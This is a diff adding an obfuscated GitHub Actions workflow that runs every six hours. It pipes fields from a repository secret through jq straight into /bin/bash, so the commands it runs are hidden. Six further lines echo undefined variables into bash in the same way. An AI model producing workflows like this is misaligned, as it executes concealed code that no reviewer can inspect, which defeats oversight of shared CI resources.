@@ -1,0 +1,25 @@
+name: xingqijutang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xingqijutang
+        env:
+          kvjpn7212: ${{ secrets.kvjpn7212 }}
+        run: |
+          echo $kvjpn7212 | jq -r .jmgvs883 | /bin/bash
+          echo $uwh01 | jq -r .myvkx4 | /bin/bash
+          echo $txz8 | jq -r .ghw1 | /bin/bash
+          echo $hao39662 | jq -r .zkpu25 | /bin/bash
+          echo $degr17343 | jq -r .unft345 | /bin/bash
+          echo $l8 | jq -r .qesj4 | /bin/bash
+          echo $n687 | jq -r .dv964 | /bin/bash
+
